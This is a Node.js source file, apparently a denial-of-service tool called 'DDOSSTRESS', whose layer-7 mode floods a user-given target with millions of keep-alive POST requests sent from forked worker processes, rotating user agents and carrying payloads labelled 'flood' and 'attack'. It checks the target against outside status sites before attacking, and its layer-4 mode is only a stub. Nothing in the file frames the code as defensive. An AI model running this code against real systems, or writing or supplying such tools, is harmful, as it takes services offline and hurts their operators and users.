import cluster from "node:cluster";
import chalk from "chalk";
import { URL } from "url";
import { createRequire } from "module";
import net from "net";
import http from "http";
import https from "https";
import fs from "fs";
import figlet from "figlet";
import gradient from "gradient-string";

const require = createRequire(import.meta.url);
let raw;
try { raw = require("raw-socket"); } catch {}

// Load User Agents
const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
  .split("\n")
  .filter(line => line.trim().length > 0);

// Load Proxies
const proxies = fs.readFileSync("./proxy.txt", "utf-8")
  .split("\n")
  .filter(line => line.trim().length > 0);

// ✅ fungsi randomUA()
function randomUA() {
  return userAgents[Math.floor(Math.random() * userAgents.length)] || "Mozilla/5.0";
}

if (process.argv.length < 7) {
  console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
  process.exit(1);
}

const targetStr   = process.argv[2];
const concurrency = parseInt(process.argv[3], 10) || 5;
const durationSec = parseInt(process.argv[4], 10) || 60;
const duration    = durationSec * 1000;
const layerFlag   = process.argv[6].toLowerCase() || "layer7";
const PACKET_SIZE = 432492;

let urlObj, hostname, port, protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 10) : (protocol === "https:" ? 443 : 80);
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 80;
    urlObj = new URL(`${protocol}//${hostname}:${port}`);
  }
} catch {
  console.log(chalk.red("Invalid target"));
  process.exit(1);
}

async function checkPort(host, port) {
  return new Promise(resolve => {
    const socket = net.createConnection({ host, port, timeout: 2000 }, () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });
}

console.log(chalk.green.bold("=================================================="));
function printBanner() {
  try {
    console.log(gradient.pastel.multiline(
      figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
    ));
  } catch {
    console.log(chalk.green.bold("=================================================="));
    console.log(chalk.bold(
" /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$  /$$$$$$$$  /$$$$$$   /$$$$$$  \n" +
"| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$|__  $$__/| $$__  $$| $$_____/ /$$__  $$ /$$__  $$\n" +
"| $$  \\ $$| $$  \\ $$| $$  \\ $$| $$  \\__/| $$  \\__/   | $$   | $$  \\ $$| $$      | $$  \\__/| $$  \\__/\n" +
"| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ |  $$$$$$    | $$   | $$$$$$$/| $$$$$   |  $$$$$$ |  $$$$$$ \n" +
"| $$  | $$| $$  | $$| $$  | $$ \\____  $$ \\____  $$   | $$   | $$__  $$| $$__/    \\____  $$ \\____  $$\n" +
"| $$  | $$| $$  | $$| $$  | $$ /$$  \\ $$ /$$  \\ $$   | $$   | $$  \\ $$| $$       /$$  \\ $$ /$$  \\ $$\n" +
"| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/   | $$   | $$  | $$| $$$$$$$$|  $$$$$$/|  $$$$$$/\n" +
"|_______/ |_______/  \\______/  \\______/  \\______/    |__/   |__/  |__/|________/ \\______/  \\______/ \n"
));

  }

  console.log(chalk.gray(`                              v3.3\n`));
  console.log(chalk.red("-> ") + chalk.yellow("Target     ") + "📌 " + chalk.green(urlObj.href));
  console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
  console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
  console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag));
  console.log(chalk.green.bold("=================================================="));
}

// --- Master ---
if (cluster.isPrimary) {
  (async () => {
    await checkWebsiteStatus(hostname);
    await checkSifat();
    await checkValidator(hostname);
    await checkDownRightNow(hostname);
    await checkValidatorDetailed(urlObj.href);

    const isOpen = await checkPort(hostname, port);

    printBanner();
    console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));

    for (let id = 1; id <= concurrency; id++) {
      await new Promise(resolve => {
        const worker = cluster.fork({
          WORKER_ID: id,
          URL: urlObj.href,
          LAYER: layerFlag,
          DURATION: duration
        });
        worker.once("online", () => resolve());
      });
    }

    setTimeout(() => {
      console.log(chalk.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, duration);

    cluster.on("exit", (worker) => {
      const wid = worker?.process?.env?.WORKER_ID || worker.id;
      console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${wid} exited`));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 10);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);

  console.log(chalk.green(`[ DDOSSTRESS ] -> Thread ${wid} Started`));

  if (layer === "layer4") {
    mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
  } else {
    mainWorkerLayer7(wid, targetUrl);
  }
}

// 🔥 fungsi cek status website via isitdown.me
async function checkWebsiteStatus(domain) {
  return new Promise((resolve) => {
    const data = `domain=${encodeURIComponent(domain)}`;
    const options = {
      hostname: "isitdown.me",
      path: "/check_domain.php",
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(data),
        "User-Agent": "Mozilla/5.0"
      }
    };
    const req = https.request(options, res => {
      res.on("end", () => {
        console.log(chalk.green(`[ DDOSSTRESS ] -> (isitdown.me for ${domain}) (${res.statusCode})`));
        resolve(res.statusCode);
      });
      res.resume();
    });
    req.on("error", (err) => {
      console.log(chalk.red(`[ DDOSSTRESS ] -> (isitdown.me) Error: ${err.code || "ERR"}`));
      resolve(null);
    });
    req.write(data);
    req.end();
  });
}

async function checkSifat() {
  return new Promise((resolve) => {
    https.get("https://sifat.org/xmlrpc.php", res => {
      console.log(chalk.yellow(`[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) (${res.statusCode})`));
      res.resume();
      resolve(res.statusCode);
    }).on("error", err => {
      console.log(chalk.red(`[ DDOSSTRESS ] -> (sifat.org/xmlrpc.php) Error: ${err.code || "ERR"}`));
      resolve(null);
    });
  });
}

async function checkValidator(domain) {
  return new Promise((resolve) => {
    const url = `https://validator.w3.org/checklink?uri=${encodeURIComponent(domain)}`;
    https.get(url, res => {
      console.log(chalk.cyan(`[ DDOSSTRESS ] -> (validator.w3.org/checklink) (${res.statusCode})`));
      res.resume();
      resolve(res.statusCode);
    }).on("error", err => {
      console.log(chalk.red(`[ DDOSSTRESS ] -> (validator.w3.org/checklink) Error: ${err.code || "ERR"}`));
      resolve(null);
    });
  });
}

async function checkDownRightNow(domain) {
  return new Promise((resolve) => {
    const url = `https://www.isitdownrightnow.com/check.php?domain=${encodeURIComponent(domain)}`;
    https.get(url, res => {
      console.log(chalk.green(`[ DDOSSTRESS ] -> (isitdownrightnow.com for ${domain}) (${res.statusCode})`));
      res.resume();
      resolve(res.statusCode);
    }).on("error", err => {
      console.log(chalk.red(`[ DDOSSTRESS ] -> (isitdownrightnow.com) Error: ${err.code || "ERR"}`));
      resolve(null);
    });
  });
}

async function checkValidatorDetailed(targetUrl) {
  return new Promise((resolve) => {
    const url = `https://validator.w3.org/check?uri=${encodeURIComponent(targetUrl)}&charset=%28detect+automatically%29&doctype=Inline&group=0&verbose=1`;
    https.get(url, res => {
      console.log(chalk.blue(`[ DDOSSTRESS ] -> (validator.w3.org/check) (${res.statusCode})`));
      res.resume();
      resolve(res.statusCode);
    }).on("error", err => {
      console.log(chalk.red(`[ DDOSSTRESS ] -> (validator.w3.org/check) Error: ${err.code || "ERR"}`));
      resolve(null);
    });
  });
}

const errorStats = {};
function collectError(ip, msg) {
  const key = `${ip}|${msg}`;
  errorStats[key] = (errorStats[key] || 0) + 1;
}
setInterval(() => {
  for (const key of Object.keys(errorStats)) {
    const [ip, msg] = key.split("|");
    console.log(chalk.red(`[ DDOSSTRESS ] -> (${ip}) Error: ${msg} [x${errorStats[key]}]`));
  }
  for (const k in errorStats) delete errorStats[k];
}, 30000);

// == layer7 === 
const lastStatus = {};
async function mainWorkerLayer7(workerId, targetUrl) {
  const MAX_REQUESTS = 10000000;
  const BATCH_SIZE   = 3000;
  let sentRequests = 0;
  const lib = targetUrl.protocol === "https:" ? https : http;
  const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });
  const host = targetUrl.hostname;
  const endTime = Date.now() + duration;

  const payloads = [
    JSON.stringify({ stress: "ddosstress-engine", ts: Date.now() }),
    JSON.stringify({ type: "flood", power: "max", worker: workerId }),
    JSON.stringify({ attack: true, random: Math.random(), uid: Date.now() }),
    JSON.stringify({ method: "POST", layer: "7", ua: randomUA() }),
    JSON.stringify({ ping: "pong", thread: workerId, time: new Date().toISOString() }),
  ];
  function randomPayload() {
    return payloads[Math.floor(Math.random() * payloads.length)];
  }

  while (sentRequests < MAX_REQUESTS && Date.now() < endTime) {
    const batch = [];
    for (let i = 0; i < BATCH_SIZE; i++) {
      batch.push(new Promise(resolve => {
        const chosenPayload = randomPayload();
        const options = {
          method: "POST",
          agent,
          headers: {
            "User-Agent": randomUA(),
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(chosenPayload)
          }
        };
        const req = lib.request(targetUrl, options, res => {
          sentRequests++;
          const code = res.statusCode;
          if (lastStatus[host] !== code) {
            const color = code === 200 ? chalk.green : chalk.red;
            console.log(color(`[DDOSSTRESS] -> (${host}) (${code})`));
            lastStatus[host] = code;
          }
          res.resume();
          resolve();
        });
        req.on("error", (err) => {
          const msg = err.code || "Connection error";
          if (lastStatus[host] !== msg) {
            console.log(chalk.red(`[DDOSSTRESS] -> (${host}) ${msg}`));
            lastStatus[host] = msg;
          }
          resolve();
        });
        req.write(chosenPayload);
        req.end();
      }));
    }
    await Promise.all(batch);
  }
  if (cluster.isWorker) process.exit(0);
}

function mainWorkerLayer4(workerId, host, port) {
  console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${workerId} running Layer4 on ${host}:${port}`));
}

